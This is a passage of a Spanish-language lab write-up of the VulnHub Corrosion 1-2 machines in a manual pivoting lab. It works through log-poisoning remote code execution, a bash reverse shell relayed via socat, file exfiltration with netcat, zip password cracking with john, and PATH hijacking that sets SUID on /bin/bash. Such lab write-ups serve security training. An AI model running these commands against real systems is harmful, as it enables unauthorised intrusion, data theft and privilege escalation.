![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/72-explotacion-de-log-poisoning-ssh.png){: width="800" }

Al terminar, si revisamos los logs desde el navegador, en los últimos veremos que el campo usuario está vacío, lo que nos hace pensar que se está interpretando el código php de su contenido:

```http
http://192.168.100.7/blog-post/archives/randylogs.php?file=/var/log/auth.log
```

![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/73-explotacion-de-log-poisoning-ssh.png)

```http
http://192.168.100.7/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id
```

![Explotación de **Log Poisoning** (SSH bypass “invalid characters“ restriction)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/74-explotacion-de-log-poisoning-ssh.png)

De esta forma confirmamos que conseguimos explotar el **Log Poisoning** *SSH* utilizando `hydra` para inyectar el código php en el campo user del log, escapando de la restricción “invalid characters” de `ssh`. En este punto podemos lanzarnos una *reverse shell* aprovechando el **RCE** para ganar acceso a la máquina víctima.

#### Entablando Reverse Shell (**Port Forwarding** con `Socat`)

Antes de lanzar la reverse shell debemos razonar lo que va a ocurrir, ya que la estamos ejecutando desde una máquina víctima de una subred a la que nuestra máquina atacante de primeras no llega. Por lo tanto, esta máquina víctima tampoco tiene visibilidad con nuestra máquina atacante; la única máquina que ve es la primera que conseguimos vulnerar, en concreto su interfaz de red 192.168.0.6. Sabiendo esto, para que llegue la *reverse shell* a nuestra máquina atacante podríamos jugar con `socat` para reenviar la comunicación que reciba un puerto de la máquina pivote a nuestra máquina atacante.

```bash
# en nuestra máquina atacante nos ponemos en escucha
nc -nlvp 443
```

Nos descargamos el ejecutable de `socat` desde su [repositorio](https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3), lo pasamos a la máquina pivote con scp:

```bash
scp socat root@10.0.2.19:/root/socat
```

Y una vez operativo en la máquina pivote establecemos el **Port Forwarding**:

```bash
./socat TCP-LISTEN:443,fork TCP:10.0.2.13:443
```

De esta forma, lo que le llegue a la máquina intermediaria por el puerto 443 lo reenviará a nuestra máquina atacante por el mismo puerto, donde estaremos en escucha. Una vez hecho esto podemos lanzar la *reverse shell*:

```http
http://192.168.100.7/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.100.6/443 0>%261'
```

![Entablando Reverse Shell (**Port Forwarding** con `Socat`)](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/75-entablando-reverse-shell-port-forwarding.png){: width="600" }

Una vez recibida la *reverse shell* aplicaremos un tratamiento de la TTY para conseguir una shell plenamente interactiva.

#### Tratamiento de la TTY 

```bash
script /dev/null -c bash
# ctrl + z
stty raw -echo;fg
reset xterm
export TERM=xterm SHELL=bash
stty rows 53 columns 206 
```

Ahora podríamos empezar con la enumeración local para escalar privilegios.

### Escalada de privilegios

- - -

#### Enumeración local

```bash
grep 'sh$' /etc/passwd
```

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/76-enumeracion-local.png){: width="600" }

```bash
getcap -r / 2>/dev/null
```

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/77-enumeracion-local.png){: width="700" }

Nada destacable de momento. Echando un vistazo al sistema de archivos de la máquina encontramos un directorio */var/backups* que contiene un archivo “user_backup.zip” protegido por contraseña.

![Enumeración local](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/78-enumeracion-local.png){: width="500" }

##### Traspaso de archivos con `netcat`

Para tratar de crackear el hash es necesario traerlo a nuestro equipo atacante, y podríamos aprovecharnos del **Port Forwarding** establecido para la *reverse shell* para conseguirlo. Entonces podríamos hacer lo siguiente:

```bash
# en nuestra máquina atacante 
nc -nlvp 443 > user_backup.zip
```

Y desde la máquina víctima:

```bash
nc 192.168.100.6 443 < user_backup.zip # Para esto es necesario que el Port Forwarding esté establecido con socat
```

De forma que recibiríamos el archivo en nuestra máquina atacante…

![Traspaso de archivos con `netcat`](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/79-traspaso-de-archivos-con-netcat.png){: width="400" }

![Traspaso de archivos con `netcat`](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/80-traspaso-de-archivos-con-netcat.png){: width="500" }

Una vez obtenido el archivo podemos tratar de crackear el hash con `john` o `hashcat`.

##### Crackeo de hash en zip

```bash
zip2john user_backup.zip > hash
```

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

![Crackeo de hash en zip](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/81-crackeo-de-hash-en-zip.png){: width="800" }

De esta forma conseguimos la contraseña para extraer los archivos del backup.

```bash
7z x user_backup.zip
```

![Crackeo de hash en zip](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/82-crackeo-de-hash-en-zip.png){: width="400" }

![Crackeo de hash en zip](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/83-crackeo-de-hash-en-zip.png){: width="600" }

Vamos a validar si esa credencial es válida para el usuario randy:

#### User Pivoting 

```bash
su randy
```

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/84-user-pivoting.png){: width="400" }

Y efectivamente logramos pivotar al usuario randy. En este punto vamos a aplicar de nuevo una enumeración local para tratar de escalar privilegios a root.

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/85-user-pivoting.png){: width="400" }

La flag de usuario en */home/randy/user.txt*.

```bash
sudo -l 
```

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/86-user-pivoting.png)

Vemos que el usuario randy puede ejecutar como root el ejecutable “easysinfo”; si le echamos un vistazo a ver qué hace:

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/87-user-pivoting.png){: width="700" }

De primeras únicamente parece que muestra cierta información del sistema, podemos tratar de averiguar más sobre lo que hace imprimiendo los caracteres legibles del binario con la herramienta `strings`.

```bash
strings /home/randy/tools/easysysinfo
```

![User Pivoting](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/88-user-pivoting.png){: width="400" }

Entre los caracteres imprimibles nos llama la atención que se ejecuta el comando cat haciendo referencia a él a través del PATH en vez de a través de su ruta absoluta como con `uname` o `date`. Esto inmediatamente nos debe hacer pensar en un **Path Hijacking**, por lo que vamos a tratar de explotarlo.

#### Path Hijacking

Lo primero es configurar la variable de entorno PATH para que la primera ruta en la que busque los ejecutables sea en el directorio actual de trabajo, es decir, */home/randy/tools*; de esta forma podremos crear nuestro propio archivo `cat` malicioso para que ejecute las instrucciones que nosotros queramos.

```bash
export PATH=/home/randy/tools/:$PATH
```

![Path Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/89-path-hijacking.png){: width="600" }

Una vez hecho podemos crear el archivo:

```c
#include <stdio.h>
#include <stdlib.h>

int main(void){
	system("chmod +s /bin/bash");
	return 0;
}
```

```bash
gcc cat.c -o cat # lo compilamos
chmod +x cat
```

Una vez hecho ejecutamos la utilidad `easysysinfo`:

```bash
sudo ./easysinfo
```

![Path Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/90-path-hijacking.png){: width="700" }

```bash
bash -p
```

![Path Hijacking](/assets/img/posts/2026-10-20-03---lab-pivoting-manual-corrosion1-2/91-path-hijacking.png){: width="600" }

Con esto habríamos completado la última máquina vulnerable de nuestro laboratorio de pivoting manual con las máquinas Corrosion:1-2 de VulnHub!!!
